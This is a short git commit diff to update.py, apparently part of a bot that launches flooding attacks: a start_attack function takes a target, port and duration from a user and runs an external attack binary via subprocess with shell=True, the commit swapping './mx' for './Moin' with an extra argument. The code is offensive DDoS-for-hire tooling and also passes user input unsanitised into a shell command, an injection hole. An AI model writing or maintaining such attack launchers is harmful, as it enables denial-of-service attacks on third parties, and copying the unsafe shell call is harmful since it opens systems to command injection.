56cf6952f1aadf5c03452156ebe274a8a2e86a74
jsosjakjjljjjlkoii <ndjdkdjksmsks@outlook.com>
2025-01-01 13:55:08 +0530

    Update update.py

--- update.py
+++ update.py
@@ -305,7 +305,7 @@ def start_attack(user_id, target, port, time):
 
     try:
         # Simulate attack execution (original logic here)
-        full_command = f"./mx {target} {port} {time}"
+        full_command = f"./Moin {target} {port} {time} 500"
         process = subprocess.run(full_command, shell=True)
         response = f"Brother enjoy 👌. Target: {target} Port: {port} Time: {time} 200"
         return True, response
